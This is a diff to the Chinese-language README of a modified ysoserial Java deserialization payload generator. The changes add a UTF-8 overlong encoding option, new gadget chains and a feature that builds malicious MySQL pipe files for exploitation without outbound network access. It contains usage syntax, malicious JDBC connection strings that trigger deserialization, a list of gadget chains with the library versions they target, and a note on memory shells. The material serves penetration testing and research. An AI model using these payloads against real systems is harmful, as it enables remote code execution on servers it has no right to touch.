@@ -4,11 +4,12 @@ ysoserial修改版，着重修改`ysoserial.payloads.util.Gadgets.createTemplate
 加入生成mysql的pipe恶意流文件功能，java-chains下版本更新。
 
 ## Usage
-
+![img.png](image/img.png)
 ```shell
 java -jar ysoserial_mysqlpipe-0.0.6-SNAPSHOT-all.jar
 Y SO SERIAL_mysqlpipe ?
-Usage: java -jar ysoserial_mysqlpipe-[version]-all.jar [mode] [payload] '[command]'
+Usage: java -jar ysoserial_mysqlpipe-[version]-all.jar [utf8long] [mode] [payload] '[command]'
+       utf8long: 可选参数，添加此参数可启用UTF-8长编码功能
 [mode]: [gadget]/[mysqlpipe]_[version]_(user)
 提供mysql的pipe恶意流文件，上传服务器，进行不出网利用,数据库为test,用户名默认mysql,可自己设置。
 mysql5: jdbc:mysql://xxx/test?useSSL=false&autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&user=mysql&socketFactory=com.mysql.jdbc.NamedPipeSocketFactory&namedPipePath=output.pcap
@@ -39,6 +40,7 @@ mysql8: jdbc:mysql://xxx/test?&maxAllowedPacket=74996390&autoDeserialize=true&qu
      Fastjson1                              @Y4er                                  fastjson:1.2.83
      Fastjson2                              @Y4er                                  fastjson:2.x
      FileUpload1                            @mbechler                              commons-fileupload:1.3.1, commons-io:2.4
+     FindClass
      Groovy1                                @frohoff                               groovy:2.3.9
      Hibernate1                             @mbechler
      Hibernate2                             @mbechler
@@ -48,6 +50,7 @@ mysql8: jdbc:mysql://xxx/test?&maxAllowedPacket=74996390&autoDeserialize=true&qu
      JSON1                                  @mbechler                              json-lib:jar:jdk15:2.4, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2, commons-lang:2.6, ezmorph:1.0.6, commons-beanutils:1.9.2, spring-core:4.1.4.RELEASE, commons-collections:3.1
      Jackson1                               @Y4er                                  jackson-databind:2.14.2
      Jackson2                               @Y4er                                  jackson-databind:2.14.2, spring-aop:4.1.4.RELEASE
+     JacksonJdk17                           @Unam4                                 jackson-databind:2.10+, spring-aop:4.1.4.RELEASE
      JavassistWeld1                         @matthias_kaiser                       javassist:3.12.1.GA, weld-core:1.1.33.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21
      Jdk7u21                                @frohoff
      Jython1                                @pwntester, @cschneider4711            jython-standalone:2.5.2
@@ -63,6 +66,7 @@ mysql8: jdbc:mysql://xxx/test?&maxAllowedPacket=74996390&autoDeserialize=true&qu
      Vaadin1                                @kai_ullrich                           vaadin-server:7.7.14, vaadin-shared:7.7.14
      Wicket1                                @jacob-baines                          wicket-util:6.23.0, slf4j-api:1.6.4
  ```
+MozillaRhino3传入js表达式。
 
 ## 内存马相关
 
@@ -104,6 +108,7 @@ java -jar ysoserial.jar CommonsBeanutils192NOCC "calc"                          
 16. Spring1
 17. Spring2
 18. Vaadin1
+19. CommonsCollections6
 
 ## mysqlpipe
 ![](image/img.png)
